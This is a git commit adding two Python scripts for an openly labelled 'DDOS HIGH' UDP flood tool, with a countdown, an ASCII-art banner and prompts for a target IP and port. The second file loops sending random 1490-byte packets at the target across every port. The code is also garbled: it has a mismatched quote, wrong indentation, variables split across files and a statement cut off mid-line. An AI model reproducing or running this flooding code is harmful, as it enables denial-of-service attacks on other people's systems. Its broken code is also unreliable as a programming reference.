9ef975920bd32c6d86591b3683219d22b5e40107
BLACK PHANTOM CYBER <46845458+BLACK-PHANTOM-CYBER@users.noreply.github.com>
2019-01-22 13:03:22 +0700

    Python
    Awkwowke

---
+++ high.py
@@ -0,0 +1,65 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+print
+print (" 1")
+time.sleep(3)
+os.system("clear")
+print (" 2")
+time.sleep(3)
+os.system("clear")
+print (" 3")
+time.sleep(3)
+os.system("clear")
+print (" 4")
+time.sleep(3)
+os.system("clear")
+print (" 5")
+time.sleep(3)
+os.system("clear")
+print
+
+os.system("clear")
+os.system("figlet BPC DDOS HIGH")
+print
+print """    
+         `/ymMMMMMMMMMMMMMMmy/`
+       /hMMMMMMMMMMMMMMMMMMMMMMh/
+     /mMMmNMMMMMNNNNNNNNMMMMMNNMMm/
+   `hNmo:dMMNNNmNNmNNmNNmNNNMMd:omNh`
+  .mh:+/hMNNNNmNNmNdhmmNNmNNNNMy/o:hm.
+ `d+://sNmMMMmMMMmdy+/mMMMmMMMmNs///+d`
+ ys.o/oMmNNNmNNMNNMmdMNNMNNmNNNmMo/o.ys
+`my.-/NmMMMMmMMNmNNyyNNmNMMmMMMMmN/:`ym`
+-h/+s/MmMMMNmNNNdym++mymNNNmNMMNmM:so/h-
+-N.o.sMmMMMNh/:-`-MosM-`-:/hNMMMmMs.+.N-
+`ho/-ohmMMMM/    -M/+M.    /MMMMmho-/oh
+ s+-s-odmNNN`     /-:/     .NNNmd+:s-+s
+ `mo/-:+ymMm                mMms+:-/om`
+  .h/+/y`hhs                yyh`y/+/h.
+   `hd/::-+.                .+-::/dy`
+     /hs+/::.--          --.::/+sh:
+       :hds+/-`          `-/+sdh:
+         `/ymM+          oMmy/"""
+print         
+print "||========>DDOS HIGHT<========||"
+
+ip = raw_input("MASUKAN IP TAGET ===> ")
+port = input("Port       ===> ")
+os.system("clear")
+os.system('python3 modules/high.py")
---
+++ high2.py
@@ -0,0 +1,11 @@
+os.system("figlet Loading..")
+time.sleep (10)
+os.system("clear")
+sent = 0
+while True:
+sock.sendto(bytes, (ip,port))
+     sent = sent + 10000000000000000000000
+     port = port + 1
+    print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port =
